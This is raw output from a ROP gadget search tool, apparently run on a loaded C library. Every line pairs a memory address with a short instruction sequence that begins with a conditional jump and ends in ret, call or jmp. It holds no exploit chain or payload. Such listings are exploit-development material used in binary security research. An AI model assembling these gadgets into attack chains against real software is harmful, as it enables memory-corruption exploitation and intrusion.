0x00002aaaaab5f860 : je 0x8a8b9 ; cmp dl, 3 ; je 0x8a891 ; movsx eax, dl ; ret
0x00002aaaaab5f860 : je 0x8a8ba ; cmp dl, 3 ; je 0x8a892 ; movsx eax, dl ; ret
0x00002aaaaab5f972 : je 0x8a986 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab5fba4 : je 0x8abae ; bsf eax, edx ; ret
0x00002aaaaab5fba4 : je 0x8abaf ; bsf eax, edx ; ret
0x00002aaaaab5fc4d : je 0x8ac65 ; bsf rax, rdx ; ret
0x00002aaaaab5fc4d : je 0x8ac66 ; bsf rax, rdx ; ret
0x00002aaaaab5fbec : je 0x8ac79 ; bsf rax, rdx ; ret
0x00002aaaaab5fbec : je 0x8ac7a ; bsf rax, rdx ; ret
0x00002aaaaab5fe1c : je 0x8ae45 ; bsf rax, rdx ; ret
0x00002aaaaab5fe1c : je 0x8ae46 ; bsf rax, rdx ; ret
0x00002aaaaab5fdac : je 0x8ae59 ; bsf rax, rdx ; ret
0x00002aaaaab5fdac : je 0x8ae5a ; bsf rax, rdx ; ret
0x00002aaaaab5ff5b : je 0x8af6d ; lea rax, qword ptr [rip + 0x1713c] ; ret
0x00002aaaaab6183b : je 0x8c84d ; lea rax, qword ptr [rip + 0xd999c] ; ret
0x00002aaaaab61b58 : je 0x8cb6a ; lea rax, qword ptr [rip + 0xbcfdf] ; ret
0x00002aaaaab61ee8 : je 0x8cefa ; lea rax, qword ptr [rip + 0xbcd7f] ; ret
0x00002aaaaab62eac : je 0x8df03 ; xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x00002aaaaab63025 : je 0x8e038 ; lea rax, qword ptr [rip + 0xdf812] ; ret
0x00002aaaaab63637 : je 0x8e649 ; lea rax, qword ptr [rip + 0x1b330] ; ret
0x00002aaaaab63757 : je 0x8e6cf ; mov word ptr [rax + rdx - 2], cx ; ret
0x00002aaaaab6379d : je 0x8e7b0 ; lea rax, qword ptr [rip + 0x10e4a] ; ret
0x00002aaaaab637de : je 0x8e7f0 ; lea rax, qword ptr [rip + 0xbee69] ; ret
0x00002aaaaab63ccb : je 0x8ecdd ; lea rax, qword ptr [rip + 0xda08c] ; ret
0x00002aaaaab63deb : je 0x8edfd ; lea rax, qword ptr [rip + 0xdb77c] ; ret
0x00002aaaaab6885d : je 0x93870 ; lea rax, qword ptr [rip + 0xb63a] ; ret
0x00002aaaaab68878 : je 0x9387d ; ret
0x00002aaaaab688a0 : je 0x938b2 ; lea rax, qword ptr [rip + 0xbcb07] ; ret
0x00002aaaaab6a14a : je 0x9515e ; xor byte ptr [rdx + 0xe], 0x2a ; ret
0x00002aaaaab6a9f8 : je 0x95a1b ; bsf eax, eax ; add rax, rdi ; add rax, rcx ; ret
0x00002aaaaab6ab3a : je 0x95b91 ; xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x00002aaaaab6abf1 : je 0x95c09 ; bsf eax, eax ; lea rax, qword ptr [rdi + rax] ; ret
0x00002aaaaab6b0c4 : je 0x960d7 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab6b7a3 : je 0x967b3 ; cmp al, 0x3d ; jne 0x967e1 ; mov rax, rdi ; pop rbx ; ret
0x00002aaaaab7300a : je 0x9e003 ; ret
0x00002aaaaab73009 : je 0x9e004 ; ret
0x00002aaaaab7302e : je 0x9e023 ; ret
0x00002aaaaab7302a : je 0x9e027 ; cmp ecx, esi ; je 0x9e027 ; ret
0x00002aaaaab7307f : je 0x9e063 ; ret
0x00002aaaaab7351b : je 0x9e559 ; rol bl, 0x90 ; bsr eax, eax ; add rax, rdi ; ret
0x00002aaaaab735fc : je 0x9e5d8 ; bsr eax, eax ; add rax, rdi ; ret
0x00002aaaaab7a4a9 : je 0xa54fa ; adc byte ptr [rsi + 0xf], ah ; xlatb ; ror byte ptr [rcx - 0x7d], 1 ; ret 0x4d10
0x00002aaaaab7bb36 : je 0xa6b87 ; adc byte ptr [rsi + 0xf], ah ; xlatb ; ror byte ptr [rcx - 0x7d], 1 ; ret 0x4d10
0x00002aaaaab7d84a : je 0xa889b ; adc byte ptr [rsi + 0xf], ah ; xlatb ; ror byte ptr [rcx - 0x7d], 1 ; ret 0x4d10
0x00002aaaaab7f05d : je 0xaa026 ; movzx eax, dl ; pop rbx ; ret
0x00002aaaaab7f035 : je 0xaa028 ; movzx eax, cl ; pop rbx ; ret
0x00002aaaaab7f05d : je 0xaa028 ; movzx eax, dl ; pop rbx ; ret
0x00002aaaaab7f182 : je 0xaa194 ; xor eax, eax ; ret
0x00002aaaaab7f17d : je 0xaa1a1 ; cmp eax, 2 ; je 0xaa199 ; xor eax, eax ; ret
0x00002aaaaab7f1cd : je 0xaa1b3 ; ret
0x00002aaaaab7f215 : je 0xaa1f3 ; ret
0x00002aaaaab80043 : je 0xab05a ; mov eax, dword ptr [rdi + 0x28] ; cmp eax, dword ptr [rsi + 0x28] ; jne 0xab0ba ; ret
0x00002aaaaab80069 : je 0xab08a ; mov eax, dword ptr [rdi + 0x30] ; cmp eax, dword ptr [rsi + 0x30] ; jne 0xab0ba ; ret
0x00002aaaaab80093 : je 0xab0aa ; mov eax, dword ptr [rdi + 0x38] ; cmp eax, dword ptr [rsi + 0x38] ; jne 0xab0ba ; ret
0x00002aaaaab8012f : je 0xab121 ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab80369 : je 0xab389 ; mov cl, dl ; and cl, 0xf ; je 0xab399 ; ret
0x00002aaaaab80370 : je 0xab392 ; ret
0x00002aaaaab80385 : je 0xab3a6 ; add rax, 2 ; ret
0x00002aaaaab8070d : je 0xab703 ; mov rax, rbx ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab80906 : je 0xab86f ; lea rax, qword ptr [rdi - 0x10] ; ret
0x00002aaaaab809b6 : je 0xaba26 ; lea rax, qword ptr [rdi - 0x10] ; ret
0x00002aaaaab809c4 : je 0xaba2a ; test al, 0xf0 ; jne 0xab9fa ; lea rax, qword ptr [rdi - 0x10] ; ret
0x00002aaaaab80c6f : je 0xabc8c ; cmp esi, dword ptr [rdi + 8] ; cmove rax, rcx ; ret
0x00002aaaaab80cc5 : je 0xabcd8 ; lea rax, qword ptr [rip + 0xc31b2] ; ret
0x00002aaaaab80e88 : je 0xabe3d ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab811b3 : je 0xac1cb ; mov edx, dword ptr [rdi] ; xor eax, eax ; test edx, edx ; sete al ; ret
0x00002aaaaab817fe : je 0xac82d ; sbb byte ptr [rcx + rcx*4 - 0x16], cl ; mov rdi, rbp ; call rbx
0x00002aaaaab81ab6 : je 0xacae5 ; sbb byte ptr [rcx + rcx*4 - 0x17], cl ; mov rdi, rbp ; call rbx
0x00002aaaaab81d66 : je 0xacd95 ; sbb byte ptr [rcx + rcx*4 - 0x19], cl ; mov r9, r15 ; call rbx
0x00002aaaaab81f18 : je 0xacf25 ; test edx, edx ; jne 0xacf17 ; ret
0x00002aaaaab81f17 : je 0xacf26 ; test edx, edx ; jne 0xacf18 ; ret
0x00002aaaaab8f66b : je 0xba662 ; mov edx, dword ptr [rsi + 8] ; cmp dword ptr [rdi + 8], edx ; jne 0xba658 ; ret
0x00002aaaaab90147 : je 0xbb174 ; sub al, 0x85 ; ror byte ptr [rdi], 0x94 ; ret 0x3840
0x00002aaaaab901fc : je 0xbb22b ; mov rdi, qword ptr [rsp + 0x68] ; call r12
0x00002aaaaab902c5 : je 0xbb2f0 ; cmp byte ptr [rax + 1], cl ; ret 0x6348
0x00002aaaaab906b6 : je 0xbb6e5 ; mov rdi, qword ptr [rsp + 0x68] ; call r12
0x00002aaaaab92897 : je 0xbd8c2 ; cmp byte ptr [rcx + 1], cl ; ret
0x00002aaaaab975e3 : je 0xc263a ; ror byte ptr [rax - 0x7d], 1 ; ret
0x00002aaaaab9b9e0 : je 0xc69fe ; mov rsi, rdi ; xor edi, edi ; call rax
0x00002aaaaaba07f1 : je 0xcb7f7 ; call rax
0x00002aaaaaba0942 : je 0xcb94b ; call rdx
0x00002aaaaaba09d3 : je 0xcb9dc ; call rax
0x00002aaaaaba1da5 : je 0xcce8b ; mov eax, 0x7f ; ret
0x00002aaaaaba1f0d : je 0xccf5c ; mov eax, 0x20 ; ret
0x00002aaaaaba1fc9 : je 0xccff9 ; mov eax, 1 ; ret
0x00002aaaaaba395c : je 0xce977 ; call 0x8ab74
0x00002aaaaaba5b2a : je 0xd0b3b ; cmp al, 0x3f ; jne 0xd0af3 ; mov eax, 1 ; ret
0x00002aaaaaba5b42 : je 0xd0b3b ; cmp al, 0x3f ; jne 0xd0b10 ; mov eax, 1 ; ret
0x00002aaaaaba9deb : je 0xd4d87 ; mov byte ptr [rdi + 8], 0x1e ; mov eax, 2 ; ret
0x00002aaaaabab0ff : je 0xd610e ; mov qword ptr [rcx], rax ; add rsp, 0x20 ; pop rbx ; ret
0x00002aaaaabab30f : je 0xd6339 ; or byte ptr [rcx], ch ; ret
0x00002aaaaabab720 : je 0xd66b9 ; pop rbx ; ret
0x00002aaaaabab752 : je 0xd66ed ; pop rbx ; ret
0x00002aaaaabab74d : je 0xd6713 ; and ebx, 8 ; je 0xd66f2 ; pop rbx ; ret
0x00002aaaaabab701 : je 0xd6716 ; mov eax, edx ; shr eax, 3 ; and eax, 1 ; pop rbx ; ret
0x00002aaaaabad692 : je 0xd86a1 ; add dword ptr [rax - 0x7d], ecx ; rol byte ptr [rcx], 0x83 ; ret 0x4001
0x00002aaaaabaf381 : je 0xda395 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabaf37c : je 0xda3aa ; cmp eax, 3 ; je 0xda39a ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabb09f9 : je 0xdba27 ; or byte ptr [rbp - 0x9df8b0a], al ; ret
0x00002aaaaabb5413 : je 0xe044f ; mov rdx, rax ; jmp 0xe03b3
0x00002aaaaabbc8b8 : je 0xe78f4 ; xor eax, eax ; ret
0x00002aaaaabbc917 : je 0xe7927 ; mov eax, 2 ; ret
0x00002aaaaabbd5d7 : je 0xe8603 ; enter 0xf41, -0x62 ; ret 0x844
0x00002aaaaabc4105 : je 0xef0e3 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabc4c3e : je 0xefc69 ; cmp byte ptr [rax - 0x77], cl ; ret 0x8b44
0x00002aaaaabc8634 : je 0xf365f ; cmp byte ptr [rax - 0x77], cl ; ret 0x69e9
0x00002aaaaabca185 : je 0xf51a3 ; mov eax, 9 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabca36a : je 0xf5373 ; ret
0x00002aaaaabcaf06 : je 0xf5f16 ; mov eax, dword ptr [rsp + 0xc] ; add rsp, 0x18 ; ret
0x00002aaaaabcaeee : je 0xf5f43 ; xor edx, edx ; xor esi, esi ; lea rdi, qword ptr [rsp + 0xc] ; call rax
0x00002aaaaabcfe70 : je 0xfae8d ; neg eax ; pop rbx ; ret
0x00002aaaaabd05e0 : je 0xfb5fa ; xor rax, 0x20 ; mov qword ptr [rsi + 0x48], rax ; ret
0x00002aaaaabd0fdf : je 0xfc009 ; sbb byte ptr [rcx], al ; ret 0x8d48
0x00002aaaaabd1098 : je 0xfc0c2 ; sbb byte ptr [rcx], al ; ret 0x8d48
0x00002aaaaabd11f5 : je 0xfc1d1 ; pop rbx ; mov eax, 0xffffffff ; pop rbp ; pop r12 ; ret
0x00002aaaaabd17ee : je 0xfc7f5 ; ret
0x00002aaaaabd3663 : je 0xfe66e ; mov qword ptr [rax], rdx ; ret
0x00002aaaaabd3732 : je 0xfe727 ; mov byte ptr [r8 - 1], 0 ; ret
0x00002aaaaabd3ce5 : je 0xfed1c ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaabd8d25 : jg 0x103cea ; int1 ; dec dword ptr [rax - 0x75] ; jge 0x103d35 ; call rbx
0x00002aaaaabed485 : jg 0x1184ba ; mov eax, esi ; mov rsp, r8 ; mov rbp, r9 ; nop ; jmp rdx
0x00002aaaaac07452 : jg 0x13249c ; mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x132468 ; ret
0x00002aaaaac0d5b2 : jg 0x1385fc ; mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x1385c8 ; ret
0x00002aaaaac21e80 : jg 0x14cefc ; loopne 0x14ce51 ; jp 0x14cf0d ; jp 0x14ce80 ; ret
0x00002aaaaac21f2c : jg 0x14cf3d ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm7 ; ret
0x00002aaaaac22370 : jg 0x14d3ec ; loopne 0x14d341 ; jp 0x14d3fd ; jp 0x14d370 ; ret
0x00002aaaaac2241c : jg 0x14d42d ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm7 ; ret
0x00002aaaaac22713 : jg 0x14d78f ; loopne 0x14d6e4 ; jp 0x14d7a0 ; jp 0x14d713 ; ret
0x00002aaaaac227bc : jg 0x14d7cd ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm7 ; ret
0x00002aaaaac275d9 : jg 0x15262c ; ret
0x00002aaaaac2765f : jg 0x1526aa ; ret
0x00002aaaaac277d9 : jg 0x15282c ; ret 0x894c
0x00002aaaaac2785f : jg 0x1528aa ; ret 0x894c
0x00002aaaaac29fa9 : jg 0x154ffc ; ret
0x00002aaaaac2a02f : jg 0x15507a ; ret
0x00002aaaaac2a1a9 : jg 0x1551fc ; ret 0x894c
0x00002aaaaac2a22f : jg 0x15527a ; ret 0x894c
0x00002aaaaac2c979 : jg 0x1579cc ; ret
0x00002aaaaac2c9ff : jg 0x157a4a ; ret
0x00002aaaaac2cb79 : jg 0x157bcc ; ret 0x894c
0x00002aaaaac2cbff : jg 0x157c4a ; ret 0x894c
0x00002aaaaac2ef48 : jg 0x159f99 ; loope 0x159f47 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac2efbf : jg 0x15a00a ; ret 0xff2
0x00002aaaaac2efd8 : jg 0x15a029 ; loop 0x159fd7 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac2f04f : jg 0x15a09a ; ret
0x00002aaaaac2f068 : jg 0x15a0b9 ; jrcxz 0x15a067 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac2f0f8 : jg 0x15a149 ; in al, -0xd ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac2f178 : jg 0x15a1c9 ; in eax, -0xd ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac2f1f8 : jg 0x15a249 ; out 0xf3, al ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac2f278 : jg 0x15a2c9 ; out -0xd, eax ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac2f2f8 : jg 0x15a349 ; call 0x4f94b2fa
0x00002aaaaac2f378 : jg 0x15a3c9 ; jmp 0x4f94b37a
0x00002aaaaac2f4f8 : jg 0x15a549 ; in al, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f578 : jg 0x15a5c9 ; in eax, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f608 : jg 0x15a659 ; out dx, al ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f688 : jg 0x15a6d9 ; out dx, eax ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f6fc : jg 0x15a707 ; ret
0x00002aaaaac2f756 : jg 0x15a769 ; ret
0x00002aaaaac2f751 : jg 0x15a7a1 ; psllq mm1, qword ptr [rdi] ; jg 0x15a76e ; ret
0x00002aaaaac2f7c6 : jg 0x15a7d9 ; ret
0x00002aaaaac2f836 : jg 0x15a849 ; ret
0x00002aaaaac2f831 : jg 0x15a881 ; or eax, 0xf7f0ff3 ; ret
0x00002aaaaac2f8a6 : jg 0x15a8b9 ; ret
0x00002aaaaac2f8a1 : jg 0x15a8f1 ; or al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac2f916 : jg 0x15a929 ; ret
0x00002aaaaac2f911 : jg 0x15a961 ; or esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac2f986 : jg 0x15a999 ; ret
0x00002aaaaac2f981 : jg 0x15a9d1 ; or dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac2f9f6 : jg 0x15aa09 ; ret
0x00002aaaaac2f9f1 : jg 0x15aa41 ; or ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac2fa66 : jg 0x15aa79 ; ret
0x00002aaaaac2fa61 : jg 0x15aab1 ; or bl, dh ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac2fad6 : jg 0x15aae9 ; ret
0x00002aaaaac2fb46 : jg 0x15ab59 ; ret
0x00002aaaaac2fbb6 : jg 0x15abc9 ; ret
0x00002aaaaac2fbb1 : jg 0x15ac01 ; add eax, 0xf7f0ff3 ; ret
0x00002aaaaac2fc26 : jg 0x15ac39 ; ret
0x00002aaaaac2fc21 : jg 0x15ac71 ; add al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac2fc96 : jg 0x15aca9 ; ret
0x00002aaaaac2fc91 : jg 0x15ace1 ; add esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac2fd06 : jg 0x15ad19 ; ret
0x00002aaaaac2fd01 : jg 0x15ad51 ; add dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac2fd76 : jg 0x15ad89 ; ret
0x00002aaaaac2fd71 : jg 0x15adc1 ; add ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac31a18 : jg 0x15ca69 ; loope 0x15ca17 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac31a8f : jg 0x15cada ; ret 0xff2
0x00002aaaaac31aa8 : jg 0x15caf9 ; loop 0x15caa7 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac31b1f : jg 0x15cb6a ; ret
0x00002aaaaac31b38 : jg 0x15cb89 ; jrcxz 0x15cb37 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac31bc8 : jg 0x15cc19 ; in al, -0xd ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac31c48 : jg 0x15cc99 ; in eax, -0xd ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac31cc8 : jg 0x15cd19 ; out 0xf3, al ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac31d48 : jg 0x15cd99 ; out -0xd, eax ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac31dc8 : jg 0x15ce19 ; call 0x4f94ddca
0x00002aaaaac31e48 : jg 0x15ce99 ; jmp 0x4f94de4a
0x00002aaaaac31fc8 : jg 0x15d019 ; in al, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac32048 : jg 0x15d099 ; in eax, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac320d8 : jg 0x15d129 ; out dx, al ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac32158 : jg 0x15d1a9 ; out dx, eax ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac321cc : jg 0x15d1d7 ; ret
0x00002aaaaac32226 : jg 0x15d239 ; ret
0x00002aaaaac32221 : jg 0x15d271 ; psllq mm1, qword ptr [rdi] ; jg 0x15d23e ; ret
0x00002aaaaac32296 : jg 0x15d2a9 ; ret
0x00002aaaaac32306 : jg 0x15d319 ; ret
0x00002aaaaac32301 : jg 0x15d351 ; or eax, 0xf7f0ff3 ; ret
0x00002aaaaac32376 : jg 0x15d389 ; ret
0x00002aaaaac32371 : jg 0x15d3c1 ; or al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac323e6 : jg 0x15d3f9 ; ret
0x00002aaaaac323e1 : jg 0x15d431 ; or esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac32456 : jg 0x15d469 ; ret
0x00002aaaaac32451 : jg 0x15d4a1 ; or dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac324c6 : jg 0x15d4d9 ; ret
0x00002aaaaac324c1 : jg 0x15d511 ; or ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac32536 : jg 0x15d549 ; ret
0x00002aaaaac32531 : jg 0x15d581 ; or bl, dh ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac325a6 : jg 0x15d5b9 ; ret
0x00002aaaaac32616 : jg 0x15d629 ; ret
0x00002aaaaac32686 : jg 0x15d699 ; ret
0x00002aaaaac32681 : jg 0x15d6d1 ; add eax, 0xf7f0ff3 ; ret
0x00002aaaaac326f6 : jg 0x15d709 ; ret
0x00002aaaaac326f1 : jg 0x15d741 ; add al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac32766 : jg 0x15d779 ; ret
0x00002aaaaac32761 : jg 0x15d7b1 ; add esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac327d6 : jg 0x15d7e9 ; ret
0x00002aaaaac327d1 : jg 0x15d821 ; add dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac32846 : jg 0x15d859 ; ret
0x00002aaaaac32841 : jg 0x15d891 ; add ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac34538 : jg 0x15f589 ; loope 0x15f537 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac345af : jg 0x15f5fa ; ret 0xff2
0x00002aaaaac345c8 : jg 0x15f619 ; loop 0x15f5c7 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac3463f : jg 0x15f68a ; ret
0x00002aaaaac34658 : jg 0x15f6a9 ; jrcxz 0x15f657 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac346e8 : jg 0x15f739 ; in al, -0xd ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac34768 : jg 0x15f7b9 ; in eax, -0xd ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac347e8 : jg 0x15f839 ; out 0xf3, al ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac34868 : jg 0x15f8b9 ; out -0xd, eax ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac348e8 : jg 0x15f939 ; call 0x4f9508ea
0x00002aaaaac34968 : jg 0x15f9b9 ; jmp 0x4f95096a
0x00002aaaaac34ae8 : jg 0x15fb39 ; in al, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac34b68 : jg 0x15fbb9 ; in eax, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac34bf8 : jg 0x15fc49 ; out dx, al ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac34c78 : jg 0x15fcc9 ; out dx, eax ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac34cec : jg 0x15fcf7 ; ret
0x00002aaaaac34d46 : jg 0x15fd59 ; ret
0x00002aaaaac34d41 : jg 0x15fd91 ; psllq mm1, qword ptr [rdi] ; jg 0x15fd5e ; ret
0x00002aaaaac34db6 : jg 0x15fdc9 ; ret
0x00002aaaaac34e26 : jg 0x15fe39 ; ret
0x00002aaaaac34e21 : jg 0x15fe71 ; or eax, 0xf7f0ff3 ; ret
0x00002aaaaac34e96 : jg 0x15fea9 ; ret
0x00002aaaaac34e91 : jg 0x15fee1 ; or al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac34f06 : jg 0x15ff19 ; ret
0x00002aaaaac34f01 : jg 0x15ff51 ; or esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac34f76 : jg 0x15ff89 ; ret
0x00002aaaaac34f71 : jg 0x15ffc1 ; or dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac34fe6 : jg 0x15fff9 ; ret
0x00002aaaaac34fe1 : jg 0x160031 ; or ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac35056 : jg 0x160069 ; ret
0x00002aaaaac35051 : jg 0x1600a1 ; or bl, dh ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac350c6 : jg 0x1600d9 ; ret
0x00002aaaaac35136 : jg 0x160149 ; ret
0x00002aaaaac351a6 : jg 0x1601b9 ; ret
0x00002aaaaac351a1 : jg 0x1601f1 ; add eax, 0xf7f0ff3 ; ret
0x00002aaaaac35216 : jg 0x160229 ; ret
0x00002aaaaac35211 : jg 0x160261 ; add al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac35286 : jg 0x160299 ; ret
0x00002aaaaac35281 : jg 0x1602d1 ; add esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac352f6 : jg 0x160309 ; ret
0x00002aaaaac352f1 : jg 0x160341 ; add dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac35366 : jg 0x160379 ; ret
0x00002aaaaac35361 : jg 0x1603b1 ; add ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac46d45 : jg 0x171d54 ; neg eax ; ret
0x00002aaaaac46e52 : jg 0x171e62 ; vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x00002aaaaac46ef3 : jg 0x171f44 ; loopne 0x171f48 ; sub eax, edx ; vzeroupper ; ret
0x00002aaaaac69371 : jg 0x194374 ; jmp qword ptr [rax + 0x20fffb80]
0x00002aaaaac6a9d1 : jg 0x1959d1 ; call rax
0x00002aaaaac6ad41 : jg 0x195d2e ; jmp rsp
0x00002aaaaac6f8a9 : jg 0x19a8a7 ; call rsp
0x00002aaaaac78a19 : jg 0x1a3a0a ; call qword ptr [rcx]
0x00002aaaaac7bd51 : jg 0x1a6d44 ; call qword ptr [rdi]
0x00002aaaaaafbcff : jg 0x26c8c ; ret 0x5c77
0x00002aaaaab097bb : jg 0x3480d ; sub eax, edx ; shr rax, 0x3f ; ret
0x00002aaaaab09c5b : jg 0x34c62 ; je 0x34c4e ; ret
0x00002aaaaab0a042 : jg 0x3508c ; or eax, esi ; je 0x34ff3 ; ret
0x00002aaaaab0a2e5 : jg 0x3531a ; mov eax, esi ; mov rsp, r8 ; mov rbp, r9 ; nop ; jmp rdx
0x00002aaaaab0fcb2 : jg 0x3acfb ; mov dword ptr [rax], edx ; mov dword ptr [rsi], edx ; ret
0x00002aaaaab1cbbb : jg 0x47c29 ; xor eax, eax ; ret
0x00002aaaaab1cd7e : jg 0x47c8f ; pop rbx ; ret
0x00002aaaaab1f1f4 : jg 0x4a201 ; ret 0x5488
0x00002aaaaab2d395 : jg 0x583ae ; test byte ptr [rbx - 0x7c00001b], bh ; ret
0x00002aaaaab38dfd : jg 0x63d8a ; ret
0x00002aaaaab4c4f7 : jg 0x77485 ; inc byte ptr [rdx] ; je 0x77511 ; mov dword ptr [rdi], edx ; ret
0x00002aaaaab61eed : jg 0x8cec0 ; or eax, dword ptr [rax] ; ret
0x00002aaaaab636ba : jg 0x8e6ce ; movdqu xmmword ptr [rdi + rdx - 0x10], xmm0 ; ja 0x8e6db ; ret
0x00002aaaaab636d2 : jg 0x8e724 ; adc bl, dh ; movq qword ptr [rdi + rdx - 0x20], mm0 ; ret
0x00002aaaaab63877 : jg 0x8e890 ; jne 0x8e867 ; mov rax, rdi ; ret
0x00002aaaaab63c47 : jg 0x8ec62 ; test dword ptr [rax + 0x48fffffb], edi ; mov eax, edi ; ret
0x00002aaaaab68937 : jg 0x9394e ; jne 0x93925 ; ret
0x00002aaaaab69e08 : jg 0x94df3 ; ret
0x00002aaaaab73fb4 : jg 0x9efc5 ; vmovdqu ymmword ptr [r9 - 0x20], ymm1 ; ret
0x00002aaaaab73fc8 : jg 0x9efd9 ; vmovdqu xmmword ptr [r9 - 0x10], xmm1 ; ret
0x00002aaaaab7443a : jg 0x9f436 ; ret
0x00002aaaaab74707 : jg 0x9f718 ; vmovdqu ymmword ptr [r9 - 0x20], ymm1 ; ret
0x00002aaaaab7471b : jg 0x9f72c ; vmovdqu xmmword ptr [r9 - 0x10], xmm1 ; ret
0x00002aaaaab74b8d : jg 0x9fb89 ; ret
0x00002aaaaab74e54 : jg 0x9fe65 ; vmovdqu ymmword ptr [r9 - 0x20], ymm1 ; ret
0x00002aaaaab74e68 : jg 0x9fe79 ; vmovdqu xmmword ptr [r9 - 0x10], xmm1 ; ret
0x00002aaaaab752da : jg 0xa02d6 ; ret
0x00002aaaaab7a276 : jg 0xa5281 ; ret
0x00002aaaaab7a286 : jg 0xa5294 ; mov byte ptr [rdi + 0x10], dh ; ret
0x00002aaaaab7a29a : jg 0xa52a9 ; mov word ptr [rdi + 0x10], cx ; ret
0x00002aaaaab7a2b9 : jg 0xa52c7 ; mov dword ptr [rdi + 0xf], ecx ; ret
0x00002aaaaab7a2c9 : jg 0xa52d7 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x00002aaaaab7a2d9 : jg 0xa52ea ; mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dh ; ret
0x00002aaaaab7a2fa : jg 0xa5309 ; mov qword ptr [rdi + 0xe], rcx ; ret
0x00002aaaaab7a31a : jg 0xa5329 ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00002aaaaab7a33a : jg 0xa5349 ; mov qword ptr [rdi + 0x10], rcx ; ret
